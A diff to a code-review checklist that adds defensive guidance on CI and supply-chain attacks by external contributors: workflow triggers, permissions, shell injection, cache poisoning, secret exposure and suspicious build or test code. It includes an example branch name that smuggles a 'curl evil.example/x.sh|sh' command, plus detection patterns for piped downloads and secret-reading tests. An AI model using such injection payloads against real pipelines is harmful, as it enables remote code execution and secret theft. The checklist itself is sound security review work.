@@ -12,7 +12,7 @@ Organized along the **Code Review Pyramid** — categories are roughly ordered f
 | D. Testing | Tests |
 | E. Documentation | Documentation |
 | F. Coding conventions (nits) | Code Style (automate where possible) |
-| G. Maven / build | Code Style / project hygiene |
+| G. Build, CI & supply chain | Implementation Semantics (security sub-tier) |
 | H. Dive TUI | (cross-cutting on cli/dive changes) |
 | I. Commit messages | (meta — affects history hygiene) |
 
@@ -205,15 +205,65 @@ These items should ideally be caught by linting / checkstyle, not manual review.
 
 ---
 
-## G. Maven / build (project hygiene)
+## G. Build, CI & supply chain
+
+This section is the **highest-attention zone for PRs from external contributors**. A malicious or compromised contributor's most lucrative target is rarely the runtime code — it's the CI pipeline, where a single merged line can exfiltrate secrets, poison caches that other PRs will restore, or backdoor build artefacts before they reach `main`. Read every change under `.github/`, `pom.xml`, `Dockerfile`, `tools/`, and any new shell script with this lens.
+
+Items G3–G12 cluster under one shared question: *would this give an external contributor a path to run code with the project's credentials, or to influence what main-branch builds will trust?*
 
 ### G1. Plugin versions only in parent
 - **Rule:** All plugin versions declared in the parent `pom.xml`'s `<pluginManagement>`. Module POMs reference by `groupId`/`artifactId` only.
 - **How:** `grep -n '<version>' */pom.xml` (excluding parent). Any plugin `<version>` in a module POM is a violation.
 
 ### G2. GitHub Actions pinned by SHA
-- **Rule:** Any new action use must be SHA-pinned, not `@vN`.
-- **How:** Diff `.github/workflows/*.yml` for `uses:` lines; check for `@<40-char-sha>` not `@v1`.
+- **Rule:** Any new action use must be SHA-pinned, not `@vN` or `@main`.
+- **Why:** Tag-pinned actions can be force-pushed by a compromised maintainer; `@main` simply runs whatever HEAD points at.
+- **How:** Diff `.github/workflows/*.yml` for `uses:` lines; require `@<40-char-sha>` not `@v1` / `@main`.
+
+### G3. Workflow trigger surface
+- **Rule:** Treat `pull_request_target`, `workflow_run`, and `schedule` as high-risk triggers. `pull_request_target` runs in the **base repo's context with a write token**, so any step that checks out the PR's code or executes PR-provided content is an immediate path to secret exfiltration.
+- **Why:** This is the single most exploited misconfiguration in OSS supply-chain attacks (`tj-actions/changed-files`, `pwn-request`-class incidents).
+- **How:** New or changed `on:` blocks in `.github/workflows/*.yml`. For `pull_request_target`: no `actions/checkout` of `${{ github.event.pull_request.head.* }}`, no `run:` steps that execute PR-supplied scripts / generators / build configs. If PR-author-controlled content reaches a `run:` block under this trigger, that's a defect.
+
+### G4. Workflow permissions
+- **Rule:** Workflows declare an explicit `permissions:` block, scoped to the minimum needed (read-only by default). Avoid `permissions: write-all` and avoid omitting the block (the org default may be wider than the workflow needs).
+- **How:** For every new or modified workflow, find the `permissions:` block. If absent, flag it. If present, ask: does every `write` scope correspond to an action the workflow actually performs?
+
+### G5. Shell injection via PR-controlled context
+- **Rule:** Never interpolate `${{ github.event.* }}`, `${{ github.head_ref }}`, PR titles, branch names, or any PR-author-controlled string directly into a `run:` body. Pass them through `env:` and reference as `"$VAR"`.
+- **Why:** A branch named `$(curl evil.example/x.sh|sh)` becomes shell when interpolated.
+- **How:** Grep new `run:` blocks for direct `${{ github\.\(event\|head_ref\|ref\|pull_request\|actor\) ` interpolation. Each hit is a defect.
+
+### G6. Cache poisoning vectors
+- **Rule:** `actions/cache` keys must not be derivable from PR-controlled content unless the cache is **scoped to that PR** and never restored by jobs that run with elevated privileges (push / scheduled / `pull_request_target`).
+- **Why:** A fork PR can populate a cache that a later main-branch job restores, executing attacker-chosen content with main's token.
+- **How:** New or changed `actions/cache` steps. Inspect the `key:` and `restore-keys:` — if they `hashFiles` over paths the PR can modify (e.g. `tools/**`, `Dockerfile`, lock files), confirm the restoring job runs only on `pull_request` (not `pull_request_target` / push to main).
+
+### G7. Secret exposure
+- **Rule:** Secrets enter steps only via `env:` — never inline `${{ secrets.X }}` in `run:` strings. No step should print, log, or upload a secret. No step on a fork PR should be granted secrets at all.
+- **How:** Grep new workflow steps for `${{ secrets\.` inside `run:` strings, `echo "$SECRET"`-style commands, `actions/upload-artifact` paths that could include logs from secret-bearing steps. If a workflow grants secrets to PR-triggered jobs (`secrets: inherit` on `workflow_call`), confirm no fork-PR path reaches it.
+
+### G8. New Maven dependencies and plugins
+- **Rule:** Every new `<dependency>` and `<plugin>` is a new trust boundary. Check (a) coordinates exist on Maven Central — not just a custom repo, (b) license is Apache-2.0-compatible, (c) the version isn't a known-bad / recently-yanked one, (d) for **annotation processors and Maven plugins**, the artifact runs code at build time with the developer's local privileges — give those additions extra scrutiny.
+- **How:** Diff `pom.xml` for new `<dependency>` / `<plugin>` blocks. Look the artifact up on `central.sonatype.com`. Flag any `<repository>` / `<pluginRepository>` addition outside Maven Central or an org-approved source.
+
+### G9. ServiceLoader / META-INF/services hijack
+- **Rule:** New or changed `META-INF/services/<interface>` files inject implementations that `ServiceLoader` will load silently at runtime. Verify each named class is in the PR's source and is what the diff implies.
+- **How:** Grep new files under `**/META-INF/services/`. Each line names a fully-qualified class — confirm it exists in the PR's source and isn't a back-door implementation of e.g. `java.security.Provider` or `java.sql.Driver`.
+
+### G10. Build/test scripts and Dockerfile changes
+- **Rule:** New shell scripts under `tools/`, `scripts/`, `.github/`, repo root, or new `RUN` lines in `Dockerfile`, are arbitrary code that runs as part of CI / developer setup. Watch for: `curl ... | sh`, `wget ... | bash`, downloads from unfixed URLs without checksum verification, `eval` of remote content, network fetches during build that aren't dependency resolution.
+- **How:** Diff every new `.sh` / `.py` / `Dockerfile` line. For each network-fetching line: is the URL fixed? Is there a `sha256sum -c` or equivalent? Does it fall back to a tag/branch (`git clone --branch main`) instead of a commit pin?
+
+### G11. Tests that exfiltrate
+- **Rule:** Tests should be hermetic. New tests that make network requests, read environment variables (especially anything matching `*_TOKEN`, `*_KEY`, `*_SECRET`), or write outside `target/` / `Files.createTempDirectory(...)` are a potential exfiltration vector if the PR is malicious.
+- **How:** Search new test files for `URL`, `HttpClient`, `System.getenv`, `Runtime.exec`, `ProcessBuilder`, `new File("/`. Legitimate uses exist (localhost integration tests, env-driven fixture paths); each one needs a benign explanation evident in the same diff.
+
+### G12. Suspicious production code patterns
+- **Rule:** Be alert to `Runtime.exec` / `ProcessBuilder` / reflection-driven class loading / base64-encoded blobs / dynamic URL fetching that appears without a clear feature need.
+- **How:** Grep the diff for `Runtime\.getRuntime\(\)`, `ProcessBuilder`, `URLClassLoader`, `Class\.forName.*\$\{`, base64-encoded strings longer than ~100 chars in source, `new URL(.*).openStream()`. Cross-check each against the PR's stated purpose — if the PR is "fix help text cutoff" and includes a new `Runtime.exec`, that's a red flag.
+
+**When in doubt:** for any of G3–G12, ask the contributor (in a PR comment, not the review file) to justify the addition. "What's the use case for this?" surfaces benign explanations cheaply and forces an attacker to lie on the record.
 
 ---
 
